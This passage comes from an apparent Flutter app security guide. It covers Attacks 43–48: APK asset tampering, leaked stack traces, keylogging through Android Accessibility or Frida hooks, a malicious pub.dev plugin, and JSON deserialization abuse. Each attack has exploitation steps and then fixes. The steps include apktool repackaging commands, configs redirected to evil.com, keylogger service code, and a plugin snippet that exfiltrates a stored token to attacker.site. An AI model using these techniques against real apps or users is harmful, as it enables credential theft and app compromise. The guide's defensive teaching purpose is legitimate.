+
+✅ Now your fake APK works with altered logic.
+
+---
+
+### 💥 **Why It Works**
+
+* Flutter apps **load assets dynamically**
+* Assets are **not integrity checked** (no hash validation by default)
+* App trusts `assets/config.json`, images, or state flags blindly
+* APK can be rebuilt and signed easily with any key (unless Play Store verifies)
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Don’t Load Sensitive Logic from Assets
+
+```dart
+// ❌ Bad:
+final isPremium = json.decode(await rootBundle.loadString('assets/config.json'));
+
+// ✅ Good:
+final status = await http.get(Uri.parse("https://api.myapp.com/status"));
+```
+
+Move all sensitive state/logic to backend.
+
+---
+
+#### ✅ Fix 2: Add Integrity Check on Assets (Optional)
+
+Compute and verify SHA-256 hashes:
+
+```dart
+Future<bool> verifyAsset(String path, String expectedHash) async {
+  final bytes = await rootBundle.load(path);
+  final digest = sha256.convert(bytes.buffer.asUint8List());
+  return digest.toString() == expectedHash;
+}
+```
+
+✅ You can store the hash in a trusted place (e.g., secure backend call).
+
+---
+
+#### ✅ Fix 3: Protect the APK
+
+* Use **Play Store signature scheme v3**
+* Enable **Google Play Protect** for distribution
+* Don’t allow sideloading on devices with sensitive data
+
+---
+
+### 🛡️ Summary
+
+| 🔐 Vulnerability | Flutter assets modified inside APK                      |
+| ---------------- | ------------------------------------------------------- |
+| 💥 Impact        | Fake premium, phishing, fake visuals, logic hijack      |
+| 🛠️ Fix          | Avoid asset-based logic, verify hash, server-side state |
+
+
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 43: FLUTTER ASSET INJECTION
+
+**(Modify `.json`, `.png`, `.ttf`, or other files in the APK)**
+
+---
+
+### 📌 **Description**
+
+Flutter loads assets like `.json`, `.txt`, `.png`, `.svg`, and `.ttf` at runtime from `flutter_assets/` inside the `.apk`. If an attacker decompiles the APK, they can **modify or inject new asset files**, repackage the app, and trick users with:
+
+* 🔓 Modified configurations (e.g., base URLs, feature flags)
+* 🎨 Visual deception (e.g., replaced logos, UI labels)
+* 🧪 Malicious behavior (e.g., loading fake update notices or injected payloads)
+* 📊 Fake analytics, feature toggles, or pricing models
+
+All without touching a single Dart file.
+
+---
+
+### 🧪 Exploitation Steps — Asset Injection via `.apk`
+
+---
+
+#### 📦 Step 1: Decompile the APK
+
+```bash
+apktool d app-release.apk -o unpacked/
+```
+
+Inside `unpacked/assets/flutter_assets/`, you’ll find:
+
+* `assets/config.json`
+* `assets/texts/en.json`
+* `assets/images/logo.png`
+* `assets/terms.txt`
+* `fonts/MyFont.ttf`
+
+---
+
+#### 💉 Step 2: Modify Assets
+
+**Examples:**
+
+* `config.json`:
+
+  ```json
+  {
+    "apiBaseUrl": "https://malicious.evil.com",
+    "features": {
+      "premiumUnlocked": true,
+      "adsEnabled": false
+    }
+  }
+  ```
+
+* `logo.png`: Replace with phishing branding
+
+* `en.json`: Change all texts to inject malicious content
+
+✅ You can now control runtime app behavior without code access.
+
+---
+
+#### 🧱 Step 3: Rebuild and Sign
+
+```bash
+apktool b unpacked -o infected.apk
+
+jarsigner -keystore hacker.jks infected.apk hackerkey
+adb install -r infected.apk
+```
+
+✅ The modified app works like normal — but now uses **your fake data**.
+
+---
+
+### 💻 Vulnerable Flutter Code (Dynamic Asset Loading)
+
+```dart
+Future<String> loadTerms() async {
+  return await rootBundle.loadString('assets/terms.txt');
+}
+
+Future<Map<String, dynamic>> loadConfig() async {
+  final jsonStr = await rootBundle.loadString('assets/config.json');
+  return jsonDecode(jsonStr);
+}
+```
+
+✅ These methods **trust file contents blindly**, which can be altered by an attacker.
+
+---
+
+### 💥 Why This Works
+
+* Flutter loads all assets from `flutter_assets/` at runtime
+* No signature checks for asset contents
+* App logic often relies on asset values (API URLs, toggles, strings, etc.)
+* No Dart changes needed — just asset swaps
+
+---
+
+### 🛡️ Secure Fix 1: Asset Integrity Check via SHA-256
+
+Before using any critical asset (e.g., config.json), verify its hash:
+
+```dart
+import 'dart:convert';
+import 'package:crypto/crypto.dart';
+
+Future<bool> verifyAsset(String path, String expectedHash) async {
+  final content = await rootBundle.loadString(path);
+  final hash = sha256.convert(utf8.encode(content));
+  return hash.toString() == expectedHash;
+}
+```
+
+✅ Compare against hardcoded or server-synced SHA256 hash.
+
+---
+
+### 🛡️ Secure Fix 2: Embed Config in Code (When Possible)
+
+Instead of using external JSON:
+
+```dart
+const String apiBaseUrl = "https://secure.api.com";
+```
+
+✅ Compiled into Dart → harder to alter.
+
+---
+
+### 🛡️ Secure Fix 3: Use Obfuscation for Critical Flutter Assets
+
+In `pubspec.yaml`:
+
+```yaml
+flutter:
+  assets:
+    - assets/config.json
+    - assets/data/obfuscated_file.dat
+```
+
+✅ Rename files, split into chunks, or encode in base64 to reduce recognizability.
+
+---
+
+### 🛡️ Secure Fix 4: Combine Asset Integrity + Play Integrity
+
+If you already implemented Play Integrity API from **Attack 17**, use it to refuse launch if app is **not from Play Store** or has been tampered:
+
+```dart
+if (!await PlayIntegrityVerifier.verify()) {
+  exit(1);
+}
+```
+
+✅ Stops asset-modified APKs from running at all.
+
+---
+
+### ⚠️ Risk Level: HIGH
+
+Asset injection = **total control over app behavior** without touching your Dart logic.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Flutter assets can be modified in repacked APKs     |
+| ---------------- | --------------------------------------------------- |
+| 💣 Impact        | API injection, visual spoofing, logic alteration    |
+| 🛠️ Fix          | Verify asset hashes, avoid critical logic in assets |
+
+
+---------------------------------------------------------------------------
+
+
+
+
+ATTACK 44: ASSET TAMPERING IN FLUTTER
+
+**(Modify Flutter assets like JSON, HTML, or Dart scripts inside the APK for logic abuse or malware injection)**
+
+---
+
+### 📌 **Description**
+
+In Flutter, files in the `assets/` folder (e.g. JSON, HTML, config files) are bundled into the APK as-is. If an attacker decompiles your APK, they can:
+
+* Extract and edit the `assets/` files
+* Replace configuration (e.g., switch API endpoints to malicious ones)
+* Modify HTML used in `WebView`
+* Change onboarding content or pricing
+* Inject fake UI for phishing
+* Then repackage and resign the APK
+
+✅ The app will run with the **attacker's modified logic** if you **don’t validate anything at runtime**.
+
+---
+
+### 🧪 Exploitation Steps – Asset File Manipulation
+
+---
+
+#### 🐍 Step 1: Extract APK and Modify Assets
+
+```bash
+apktool d myapp.apk -o myapp_src
+cd myapp_src/assets/
+```
+
+✅ Here, attacker sees files like:
+
+* `config.json`
+* `welcome.html`
+* `terms_and_conditions.txt`
+* `offers.json`
+
+Modify `config.json`:
+
+```json
+{
+  "api_url": "https://evil.com/api",
+  "features": { "premiumAccess": true }
+}
+```
+
+---
+
+#### 🧪 Step 2: Rebuild APK and Reinstall
+
+```bash
+apktool b myapp_src -o hacked.apk
+jarsigner -keystore attacker.keystore hacked.apk alias_name
+adb install -r hacked.apk
+```
+
+✅ Flutter loads assets as-is:
+
+```dart
+String jsonString = await rootBundle.loadString('assets/config.json');
+```
+
+➡️ Now points to **attacker's API**, fake plans, malicious terms, phishing UI, or manipulated offers.
+
+---
+
+### 💥 Real-World Impact
+
+| Asset Modified       | Effect                           |
+| -------------------- | -------------------------------- |
+| `config.json`        | API URL hijack, forced premium   |
+| `welcome.html`       | Phishing UI                      |
+| `assets/db.json`     | Preload attacker-controlled data |
+| `assets/license.txt` | Fake terms & conditions          |
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+final data = await rootBundle.loadString('assets/config.json');
+final config = jsonDecode(data);
+```
+
+✅ Loads tampered file without verification.
+
+---
+
+### 🛡️ Secure Fix 1: Use Asset Hash Checksums at Runtime
+
+Calculate and validate hashes:
+
+```dart
+import 'dart:convert';
+import 'package:crypto/crypto.dart';
+
+Future<bool> verifyAsset(String path, String expectedHash) async {
+  final bytes = await rootBundle.load(path);
+  final hash = sha256.convert(bytes.buffer.asUint8List()).toString();
+  return hash == expectedHash;
+}
+```
+
+✅ Prevents use of modified asset files.
+
+---
+
+### 🛡️ Secure Fix 2: Move Critical Configs to Backend
+
+Don’t load sensitive settings like API URLs or pricing from local assets:
+
+```dart
+// ❌ Insecure
+final apiUrl = config["api_url"];
+
+// ✅ Better
+final apiUrl = await getRemoteConfigFromBackend();
+```
+
+✅ Backend can’t be modified from APK.
+
+---
+
+### 🛡️ Secure Fix 3: Use App Signature or APK Verification
+
+Ensure that your app hasn't been re-signed or repackaged:
+
+* Use **Play Integrity API** or **SafetyNet**
+* Detect **app signature mismatch** (e.g., compare `BuildConfig.SIGNATURE`)
+
+---
+
+### 🛡️ Secure Fix 4: Obfuscate and Minify Asset Contents
+
+Use tools to minify JSON or encrypt static data:
+
+```json
+{"a":"https://api.myapp.com","b":true}
+```
+
+✅ Makes tampering harder (not foolproof).
+
+---
+
+### ⚠️ Risk Level: MEDIUM to HIGH
+
+Asset tampering = fake UI, logic change, or data hijack.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Flutter loads unverified local assets          |
+| ---------------- | ---------------------------------------------- |
+| 💣 Impact        | Phishing UI, backend hijack, fake offers       |
+| 🛠️ Fix          | Use runtime hash checks, avoid logic in assets |
+
+
+
+
+--------------------------------------------------------------------------
+
+
+
+ATTACK 45: VERBOSE ERROR MESSAGES & STACK TRACE EXPOSURE**
+
+📌 **Description**
+When a Flutter app or its backend exposes **detailed error messages, stack traces, exception dumps**, or debug logs in production, attackers can gain sensitive insights like:
+
+* Internal file paths
+* API structure
+* Database queries
+* Hidden routes or logic
+* Framework and server versions
+
+This is a **goldmine for reconnaissance** and further exploitation.
+
+---
+
+**🧪 Exploitation Steps (Real API Abuse Walkthrough)**
+
+1. Send intentionally broken or malformed request:
+
+```bash
+curl -X POST https://api.example.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "<script>", "password": ""}'
+```
+
+2. If the backend returns something like:
+
+```json
+{
+  "error": "Unhandled Exception: FormatException: Unexpected character"
+}
+```
+
+Or worse:
+
+```json
+{
+  "exception": "NoSuchMethodError",
+  "stacktrace": "package:myapp/src/auth.dart:41:23\nloginUser()\nmain.dart:22"
+}
+```
+
+✅ You just got internal filenames, function names, line numbers — everything.
+
+3. Chain it with source map leaks, version headers (`X-Powered-By: Express`), and you can fingerprint the tech stack fully.
+
+---
+
+**💻 Flutter-Side Mistake**
+
+If you do this:
+
+```dart
+try {
+  final res = await http.post(...);
+} catch (e, stack) {
+  print('Error: $e');
+  print('Stacktrace: $stack');
+}
+```
+
+✅ This exposes full debug details in **release builds** if not controlled.
+
+---
+
+**💥 Why This Works**
+
+* Developers leave detailed error logging ON during production.
+* Server frameworks (Node.js, Laravel, Django, etc.) return full stack traces by default.
+* Flutter devs often print `e.toString()` without conditions.
+
+---
+
+**🛡️ Secure Fix 1: Hide Stack Traces in Production**
+
+**Flutter Code Fix:**
+
+```dart
+import 'package:flutter/foundation.dart';
+
+try {
+  // request
+} catch (e, stack) {
+  if (kDebugMode) {
+    print('Error: $e');
+    print('Stacktrace: $stack');
+  } else {
+    print('An error occurred. Please try again.');
+  }
+}
+```
+
+✅ This ensures stack traces only show in debug builds.
+
+---
+
+**🛡️ Secure Fix 2: Sanitize Backend Error Output**
+
+In Express.js (Node):
+
+```js
+app.use((err, req, res, next) => {
+  console.error(err); // log internally
+  res.status(500).json({ error: "Something went wrong." });
+});
+```
+
+In Django:
+
+```python
+DEBUG = False
+ALLOWED_HOSTS = ['yourdomain.com']
+```
+
+In Laravel:
+
+```env
+APP_DEBUG=false
+```
+
+✅ No trace, no sensitive data shown to users.
+
+---
+
+**🛡️ Secure Fix 3: Remove Framework Version Headers**
+
+Use middleware to remove headers like:
+
+* `X-Powered-By`
+* `Server: nginx/1.14.0`
+
+---
+
+**⚠️ Risk Level: MEDIUM to HIGH**
+While not an exploit directly, it **exposes your internal structure**, making further attacks (SQLi, RCE, IDOR, etc.) much easier.
+
+---
+
+✅ Always sanitize error messages
+✅ Log internally, not to users
+✅ Strip debug output from release builds
+
+
+----------------------------------------------------------------------------
+
+
+
+ATTACK 46: FLUTTER KEYBOARD INPUT LOGGING
+
+**(via Native Input Hooking or Accessibility Hijack)**
+
+---
+
+### 📌 **Description**
+
+Even though Flutter’s UI is secure within its sandbox, Android still handles the **actual keyboard input events**. That means attackers can:
+
+* 🕵️ Hook into native `InputMethodService` or `EditText` events
+* 🦯 Abuse Accessibility APIs to **read typed text live**
+* 🧪 Capture Flutter `TextField` inputs without touching Dart code
+* 🔐 Steal passwords, chats, OTPs, email, etc.
+
+This attack works even when **Flutter text fields are obscured or hidden**, and **no root is required** if Accessibility is misused.
+
+---
+
+### 🧪 Exploitation Steps – Keylogging Input on Flutter App
+
+---
+
+### 💉 Method 1: Accessibility Service (No Root Required)
+
+1. Attacker creates a malicious app that requests this in `AndroidManifest.xml`:
+
+```xml
+<service
+  android:name=".KeyloggerService"
+  android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+  android:exported="true">
+  <intent-filter>
+    <action android:name="android.accessibilityservice.AccessibilityService" />
+  </intent-filter>
+  <meta-data
+    android:name="android.accessibilityservice"
+    android:resource="@xml/accessibility_config" />
+</service>
+```
+
+2. Accessibility config (`res/xml/accessibility_config.xml`):
+
+```xml
+<accessibility-service
+  android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused"
+  android:packageNames="com.example.victimapp"
+  android:accessibilityFeedbackType="feedbackGeneric"
+  android:notificationTimeout="100"
+  android:canRetrieveWindowContent="true" />
+```
+
+3. Java Code:
+
+```java
+@Override
+public void onAccessibilityEvent(AccessibilityEvent event) {
+  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+    CharSequence input = event.getText().toString();
+    Log.d("KEYLOGGER", "Typed: " + input);
+  }
+}
+```
+
+✅ Now, every text change in your Flutter app is logged.
+
+---
+
+### 💉 Method 2: Native Hook on Android EditText
+
+On rooted devices, use **Frida** to hook input methods used by Flutter’s text engine (`TextInputPlugin` uses native Android views):
+
+```js
+Java.perform(function () {
+  var EditText = Java.use('android.widget.EditText');
+  EditText.setText.overload('java.lang.CharSequence').implementation = function (str) {
+    console.log('[KEYLOG] Input: ' + str);
+    return this.setText(str);
+  };
+});
+```
+
+✅ Captures all programmatic and user-set text.
+
+---
+
+### 💻 Affected Flutter Widgets
+
+```dart
+TextField(
+  controller: _emailController,
+  obscureText: false,
+)
+
+TextField(
+  controller: _passwordController,
+  obscureText: true, // 🛑 Still vulnerable
+)
+```
+
+✅ `obscureText: true` only hides visual text — the **actual input is still accessible natively**.
+
+---
+
+### 💥 Why This Works
+
+* Flutter text input goes through native `EditText`
+* Accessibility Services can **read** view content by default
+* Root or Frida can hook `setText`, `getText`, or `onTextChanged`
+* Developers don’t validate input focus source or visibility
+
+---
+
+### 🛡️ Secure Fix 1: Detect Suspicious Accessibility Services
+
+Use `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES`:
+
+```dart
+Future<bool> hasSuspiciousAccessibility() async {
+  const platform = MethodChannel('accessibility_check');
+  final String? services = await platform.invokeMethod('getEnabledServices');
+  return services != null && services.contains("unknownapp.keylogger");
+}
+```
+
+✅ Block app or warn user if unknown services are active.
+
+---
+
+### 🛡️ Secure Fix 2: Use Secure Keyboard or Native Input Isolation
+
+* Prevent sensitive input from being auto-filled or read via APIs
+* On Android, create `FLAG_SECURE` windows for sensitive fields:
+
+```java
+getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
+                     WindowManager.LayoutParams.FLAG_SECURE);
+```
+
+✅ Blocks screenshots and accessibility overlays.
+
+---
+
+### 🛡️ Secure Fix 3: Use Custom Keyboard (Optional for High-Security Apps)
+
+A fully isolated keyboard UI within the app can block system input hooks, like how banking apps do.
+
+---
+
+### 🛡️ Secure Fix 4: Obfuscate Input Processing Logic
+
+Instead of:
+
+```dart
+setState(() => _password = input);
+```
+
+Use delayed or encoded input processing:
+
+```dart
+Timer(Duration(milliseconds: 100), () {
+  final decoded = utf8.decode(base64Decode(inputEncoded));
+  _password = decoded;
+});
+```
+
+✅ Makes dynamic hooking harder.
+
+---
+
+### ⚠️ Risk Level: CRITICAL
+
+Keylogging = instant access to user credentials, messages, PINs, and secrets — with or without root.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Native input capture via Accessibility or Input Hook                 |
+| ---------------- | -------------------------------------------------------------------- |
+| 💣 Impact        | Real-time logging of email, passwords, OTP, chat                     |
+| 🛠️ Fix          | Detect accessibility abuse, use FLAG\_SECURE, limit input visibility |
+
+
+
+-----------------------------------------------------------------------
+
+
+🔥 **ATTACK 47 – Supply Chain Attack via Malicious Flutter Plugin (pub.dev)**
+
+> *(This is one of the **most dangerous** and real threats — even Google and npm have suffered from this type of attack.)*
+
+---
+
+### 📌 **Description**
+
+Flutter apps often blindly install packages from `pub.dev`, assuming they are safe. But **anyone can publish a package** — even one that looks like a trusted plugin (e.g., `http`, `device_info`, `firebase_core`).
+
+A malicious actor can:
+
+* Publish a **lookalike plugin**
+* Inject **spyware**, **token stealers**, or **command-and-control (C2)** logic
+* Get their code **executed inside production apps**
+
+Even worse — Flutter doesn't restrict what native code a plugin can include.
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🧨 Step 1: Publish a Trojan Plugin
+
+Create a plugin called something innocent like:
+
+```yaml
+name: http_plus_plus
+description: Lightweight HTTP wrapper
+```
+
+Inside the Dart code or `android/src/main/java/...`:
+
+```dart
+@override
+Future<String> getDeviceInfo() async {
+  final token = await SharedPreferences.getInstance().then((prefs) => prefs.getString('token'));
+  await http.post(
+    Uri.parse('https://attacker.site/leak'),
+    body: {'token': token}
+  );
+  return "Safe";
+}
+```
+
+#### 🧨 Step 2: Upload to pub.dev
+
+```bash
+flutter pub publish
+```
+
+If it gets installed by a dev:
+
+* No warnings unless they inspect the code
+* Code runs natively or through MethodChannel
+* Data is exfiltrated silently
+
+#### 🧨 Step 3: Victim Installs It
+
+```yaml
+dependencies:
+  http_plus_plus: ^1.0.0
+```
+
+✅ The app is now compromised.
+
+---
+
+### 💥 **Why It Works**
+
+* `pub.dev` doesn’t manually vet every package
+* Flutter plugins can include **native code** (Java/Kotlin/Swift/Obj-C)
+* Dart/Flutter doesn’t block outbound HTTP calls
+* Obfuscation hides the payload
+* Most devs trust plugin descriptions and don’t review code
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Only Use Trusted Plugins
+
+* Stick to well-maintained packages with:
+
+  * High stars ⭐
+  * Frequent updates
+  * Maintainers with verified accounts
+
+#### ✅ Fix 2: Review Plugin Source Before Use
+
+```bash
+# Clone the repo
+git clone https://github.com/username/http_plus_plus
+```
+
+Look inside:
+
+* `lib/` for hidden logic
+* `android/` or `ios/` for suspicious native calls
+* `pubspec.yaml` for weird dependencies
+
+#### ✅ Fix 3: Lock Dependencies (Avoid Wildcards)
+
+❌ Bad:
+
+```yaml
+bad_plugin: any
+```
+
+✅ Good:
+
+```yaml
+bad_plugin: 1.0.0
+```
+
+Use:
+
+```bash
+flutter pub deps
+flutter pub outdated
+```
+
+#### ✅ Fix 4: Use `pub.dev` Verified Publishers
+
+Only use packages from:
+
+* `flutter.dev`
+* `google.dev`
+* `firebase.google.com`
+
+These are **officially verified** teams.
+
+#### ✅ Fix 5: Self-host Private Packages (Optional)
+
+If you're running a large team:
+
+* Use **internal pub servers**
+* Block `pub.dev` plugins unless whitelisted
+
+---
+
+### 🛡️ Real-World Examples
+
+| 📦 Plugin Name | 🚨 What Happened                       |
+| -------------- | -------------------------------------- |
+| `eventsource`  | Published with hidden payload (npm)    |
+| `ua-parser-js` | Crypto miner was injected in update    |
+| `colors.js`    | Author sabotaged it with infinite loop |
+
+Same style attacks are **possible in Flutter** if you install malicious plugins.
+
+---
+
+### ✅ Summary
+
+| 🔐 Vulnerability | Installing 3rd-party plugin with hidden code               |
+| ---------------- | ---------------------------------------------------------- |
+| 💥 Impact        | Full app compromise, data theft, malware                   |
+| 🛠️ Fix          | Audit plugin code, lock versions, use trusted authors only |
+
+
+
+---------------------------------------------------------------------
+
+
+
+
+
+ATTACK 48: DEEP OBJECT DESERIALIZATION ABUSE
+
+**(Manipulate nested JSON or untrusted data into logic abuse or type confusion)**
+
+---
+
+### 📌 **Description**
+
+In Dart/Flutter, apps often deserialize data using:
+
+```dart
+Map<String, dynamic> user = jsonDecode(response.body);
+```
+
+If you assume this is safe and **don’t validate deeply nested data**, attackers can:
+
+* Inject fake values (like `"isAdmin": true`)
+* Supply unexpected types (e.g., strings instead of int)
+* Crash your app with `null`, overflows, or unexpected keys
+* Forge data for role elevation, business logic abuse, or DoS
+
+✅ **This attack doesn’t require code execution — just input manipulation**.
+
+---
+
+### 🧪 Exploitation Steps — Deserialization Logic Injection
+
+---
+
+#### 🎯 Step 1: Intercept API or Config Payload
+
+Example JSON:
+
+```json
+{
+  "user": {
+    "id": "abc",
+    "role": "user",
+    "isAdmin": false
+  }
+}
+```
+
+Attacker modifies payload via proxy or tampered backend:
+
+```json
+{
+  "user": {
+    "id": "abc",
+    "role": "admin",
+    "isAdmin": true,
+    "features": { "premium": true }
+  }
+}
+```
+
+✅ App trusts JSON blindly — attacker gains premium access or admin role.
+
+---
+
+#### 🐍 Step 2: Craft Payload to Crash Logic
+
+```json
+{
+  "user": {
+    "id": null,
+    "role": [],
+    "isAdmin": "yes"
+  }
+}
+```
+
+✅ If app expects `role` as String or `isAdmin` as bool — runtime crash occurs.
+
+---
+
+#### 💣 Step 3: Supply Hidden Keys
+
+If your app has:
+
+```dart
+if (user["isAdmin"] == true) {
+  showAdminPanel();
+}
+```
+
+…attacker can forge:
+
+```json
+"user": { "isAdmin": true }
+```
+
+✅ Admin panel is now visible.
+
+---
+
+### 💥 Why This Works
+
+* `jsonDecode` allows any dynamic structure
+* Developers don’t validate types/keys deeply
+* Dart’s loose typing on `Map<String, dynamic>` leads to abuse
+* No schema or runtime enforcement by default
+* Many developers skip null/type checking on nested objects
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+final response = await http.get(...);
+final userData = jsonDecode(response.body);
+
+if (userData["user"]["isAdmin"] == true) {
+  enableAdminUI();
+}
+```
+
+✅ Attacker modifies `isAdmin` → becomes admin.
+
+---
+
+### 🛡️ Secure Fix 1: Use Typed Models with FromJson Validation
+
+Instead of dynamic access:
+
+```dart
+final user = User.fromJson(jsonDecode(response.body));
+```
+
+And in model:
+
+```dart
+factory User.fromJson(Map<String, dynamic> json) {
+  return User(
+    id: json["id"] ?? '',
+    role: json["role"] == 'admin' ? 'admin' : 'user',
+    isAdmin: json["isAdmin"] == true,
+  );
+}
+```
+
+✅ Sanitize and normalize on deserialization.
+
+---
+
+### 🛡️ Secure Fix 2: Enforce Type Safety & Use `try/catch`
+
+Wrap risky decoding:
+
+```dart
+try {
+  final data = jsonDecode(jsonString);
+  if (data["user"] is! Map) throw FormatException("Invalid user object");
+} catch (_) {
+  // Handle corrupt or malicious data
+}
+```
+
+✅ Stops logic abuse before it hits business flow.
+
+---
+
+### 🛡️ Secure Fix 3: Deep Input Sanitization
+
+On all nested objects:
+
+```dart
+bool isValid = data["user"] is Map &&
+               data["user"]["role"] is String &&
+               ["admin", "user"].contains(data["user"]["role"]);
+```
+
+✅ Only accept known roles, types, and formats.
+
+---
+
+### 🛡️ Secure Fix 4: Validate with Schemas (Optional)
+
+Use packages like [`json_schema`](https://pub.dev/packages/json_schema):
+
+```dart
+final schema = JsonSchema.createSchema(...);
+final isValid = schema.validate(jsonData).isValid;
+```
+
+✅ Enforces structure at runtime.
+
+---
+
+### ⚠️ Risk Level: MEDIUM to HIGH
+
+Deserialization flaws = logic bypass, feature unlocking, or DoS.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Unvalidated JSON or object parsing       |
+| ---------------- | ---------------------------------------- |
+| 💣 Impact        | Role elevation, logic tampering          |
+| 🛠️ Fix          | Use models, type checks, sanitize deeply |
+
+
+-----------------------------------------------------------------------
